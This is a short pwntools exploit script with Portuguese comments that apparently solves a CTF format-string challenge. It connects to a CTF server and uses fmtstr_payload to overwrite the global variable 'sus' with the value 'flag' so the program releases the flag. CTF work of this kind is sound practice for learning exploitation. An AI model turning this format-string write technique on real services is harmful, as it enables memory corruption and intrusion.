from pwn import *
# Configurações iniciais do binário e arquitetura (64-bit)
#binary_path = './format-string-2'
#context.binary = elf = ELF(binary_path)
context.log_level = 'debug'

# Defina a conexão: use 'process' para testar localmente ou 'remote' para o servidor do CTF
# io = process(binary_path)
io = remote('chatelaine.cylabacademy.net', 46439)

# Endereço estático da variável 'sus' (obtido via GDB: p &sus)
sus_addr = 0x404048

# O valor alvo que precisamos colocar em 'sus' para liberar a flag
# 0x67616c66 em ASCII corresponde a "galf" (Little Endian para "flag")
target_value = 0x67616c66

# O offset da stack onde o nosso input começa a aparecer (índice 13)
offset = 13

log.info(f"Endereço alvo (sus): {hex(sus_addr)}")
log.info(f"Valor alvo: {hex(target_value)}")
log.info(f"Offset da stack: {offset}")

# A função mágica do pwntools cria automaticamente o payload de Format String Writing.
# Ela calcula os espaçamentos necessários e insere os endereços e os operadores (%n / %hhn).
payload = fmtstr_payload(offset, {sus_addr: target_value}, write_size='byte')

log.info(f"Payload gerado com {len(payload)} bytes.")

# Envia o payload para o programa quando ele solicitar a entrada
io.sendlineafter(b"What do you have to say?\n", payload)

# Recebe a resposta do servidor (incluindo a flag se o exploit funcionar)
response = io.recvall(timeout=3)
print(response.decode('utf-8'))